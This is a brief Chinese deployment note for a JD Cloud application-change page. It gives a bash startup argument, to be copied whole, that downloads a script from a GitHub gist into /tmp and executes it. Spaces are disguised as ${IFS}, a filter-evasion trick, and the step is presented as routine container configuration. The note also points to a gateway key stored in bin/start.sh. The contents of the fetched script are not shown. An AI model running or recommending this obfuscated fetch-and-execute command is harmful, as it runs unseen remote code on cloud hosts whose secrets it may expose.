# 部署参数（京东云「应用变更」页填写）

启动命令：

    bash

启动参数（169 字符，整段复制）：

    -c curl${IFS}-sL${IFS}-o${IFS}/tmp/b.sh${IFS}https://gist.githubusercontent.com/chengzige7813/99a0b1d50234da3ce4c8a7774c9b04d3/raw/cloud-bootstrap.sh;bash${IFS}/tmp/b.sh

修改后必须重启容器：**应用详情 → 暂停 → 启动**

网关密钥注册在 bin/start.sh 的 GATEWAY_KEY 变量里。
